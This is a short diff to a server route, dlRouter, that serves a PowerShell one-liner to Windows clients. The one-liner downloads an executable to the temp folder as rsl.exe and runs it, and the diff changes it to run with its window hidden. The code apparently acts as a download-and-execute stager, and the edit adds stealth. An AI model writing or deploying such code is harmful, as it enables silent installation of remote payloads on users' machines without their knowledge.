@@ -237,7 +237,7 @@ export function dlRouter() {
 
     const isWindows = osName === "windows" || osName === "win";
     if (isWindows) {
-      const script = `$r="${dlUrl}"; $o="$env:TEMP\\rsl.exe"; (New-Object Net.WebClient).DownloadFile($r,$o); Start-Process $o`;
+      const script = `$u='${dlUrl}'; $o="$env:TEMP\\rsl.exe"; Invoke-WebRequest -Uri $u -OutFile $o; Start-Process $o -WindowStyle Hidden`;
       res.setHeader("Content-Type", "text/plain");
       res.send(script);
     } else {
